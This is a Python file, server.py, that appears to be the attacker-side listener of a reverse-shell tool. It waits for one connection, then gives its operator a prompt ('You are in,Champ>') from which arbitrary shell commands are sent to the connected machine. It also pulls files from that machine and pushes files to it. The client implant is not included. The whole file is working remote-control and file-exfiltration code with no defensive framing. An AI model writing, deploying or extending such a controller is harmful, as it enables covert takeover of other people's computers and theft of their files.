# server.py
import socket
import os

SERVER_PORT = 8080
CHUNK_SIZE = 8192  # 8 KB chunk size for file transfer

def start_server():
    server_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    server_socket.bind(('172.16.45.8', SERVER_PORT))  # Bind to any available network interface
    server_socket.listen(1)
    print("Server is listening on port 8080...")

    conn, addr = server_socket.accept()  # Wait for a client to connect
    print(f"Connection established with {addr}")

    while True:
        command = input("You are in,Champ> ")

        if command.lower() == 'exit':
            conn.send(command.encode())
            break
        elif command.startswith("cd"):
            conn.send(command.encode())
            response = conn.recv(4096).decode()
            print(response)
        elif command.startswith("download"):
            conn.send(command.encode())
            _, file_path = command.split(maxsplit=1)
            file_size = int(conn.recv(1024).decode().split()[1])
            
            with open(file_path, 'wb') as file:
                received = 0
                while received < file_size:
                    data = conn.recv(CHUNK_SIZE)
                    if not data:
                        break
                    file.write(data)
                    received += len(data)
                    percent_complete = (received / file_size) * 100
                    print(f"Download Progress: {percent_complete:.2f}%")
                print(f"File {file_path} downloaded successfully.")
        elif command.startswith("upload"):
            _, file_path = command.split(maxsplit=1)
            conn.send(command.encode())
            with open(file_path, 'rb') as file:
                while chunk := file.read(CHUNK_SIZE):
                    conn.sendall(chunk)
            print(f"File {file_path} uploaded successfully.")
        else:
            conn.send(command.encode())
            output = conn.recv(4096).decode()
            print(output)

    conn.close()
    server_socket.close()

if __name__ == "__main__":
    start_server()
